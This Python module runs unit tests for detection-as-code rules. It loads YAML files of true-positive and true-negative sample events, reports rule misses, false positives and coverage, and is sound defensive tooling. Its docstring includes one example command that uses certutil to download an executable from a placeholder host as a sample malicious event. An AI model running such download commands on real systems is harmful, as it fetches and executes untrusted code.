"""Detection-as-code unit tests: every rule ships with true-positive and
true-negative sample events, and CI fails if a rule stops firing (or starts
firing on benign activity).

A test file looks like::

    rule_id: 5f1d...            # must match the rule's id
    true_positives:
      - {Image: 'C:\\Windows\\System32\\certutil.exe', CommandLine: 'certutil -urlcache -f http://x/a.exe'}
    true_negatives:
      - {Image: 'C:\\Windows\\System32\\certutil.exe', CommandLine: 'certutil -hashfile a.txt SHA256'}
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import yaml

from .rules import Rule


@dataclass
class RuleTestCase:
    rule_id: str
    true_positives: list[dict[str, Any]]
    true_negatives: list[dict[str, Any]]
    source: str = ""


@dataclass
class RuleTestResult:
    rule_id: str
    rule_title: str
    missed_positives: list[int] = field(default_factory=list)
    false_positives: list[int] = field(default_factory=list)
    tp_total: int = 0
    tn_total: int = 0

    @property
    def passed(self) -> bool:
        return not self.missed_positives and not self.false_positives and self.tp_total > 0

    def failure_messages(self) -> list[str]:
        msgs = []
        if self.tp_total == 0:
            msgs.append("no true-positive samples: every rule must prove it fires")
        for i in self.missed_positives:
            msgs.append(f"did NOT match true_positives[{i}]")
        for i in self.false_positives:
            msgs.append(f"incorrectly matched true_negatives[{i}]")
        return msgs


@dataclass
class TestSuiteResult:
    results: list[RuleTestResult]
    untested_rules: list[Rule]
    orphan_tests: list[str]

    @property
    def passed(self) -> bool:
        return all(r.passed for r in self.results) and not self.orphan_tests

    @property
    def coverage_pct(self) -> float:
        total = len(self.results) + len(self.untested_rules)
        return 100.0 * len(self.results) / total if total else 0.0


def evaluate_case(rule: Rule, case: RuleTestCase) -> RuleTestResult:
    result = RuleTestResult(
        rule_id=rule.id,
        rule_title=rule.title,
        tp_total=len(case.true_positives),
        tn_total=len(case.true_negatives),
    )
    result.missed_positives = [i for i, ev in enumerate(case.true_positives) if not rule.matches(ev)]
    result.false_positives = [i for i, ev in enumerate(case.true_negatives) if rule.matches(ev)]
    return result


def load_test_cases(paths: list[Path | str]) -> list[RuleTestCase]:
    cases = []
    for raw in paths:
        path = Path(raw)
        files = sorted(p for p in path.rglob("*") if p.suffix in {".yml", ".yaml"}) if path.is_dir() else [path]
        for file in files:
            data = yaml.safe_load(file.read_text(encoding="utf-8")) or {}
            if not isinstance(data, dict) or "rule_id" not in data:
                raise ValueError(f"{file}: test file must be a mapping with a 'rule_id'")
            cases.append(
                RuleTestCase(
                    rule_id=str(data["rule_id"]),
                    true_positives=list(data.get("true_positives") or []),
                    true_negatives=list(data.get("true_negatives") or []),
                    source=str(file),
                )
            )
    return cases


def run_suite(rules: list[Rule], cases: list[RuleTestCase]) -> TestSuiteResult:
    by_id = {r.id: r for r in rules}
    results, tested, orphans = [], set(), []
    for case in cases:
        rule = by_id.get(case.rule_id)
        if rule is None:
            orphans.append(f"{case.source}: no rule with id {case.rule_id}")
            continue
        tested.add(rule.id)
        results.append(evaluate_case(rule, case))
    untested = [r for r in rules if r.id not in tested]
    return TestSuiteResult(results=results, untested_rules=untested, orphan_tests=orphans)
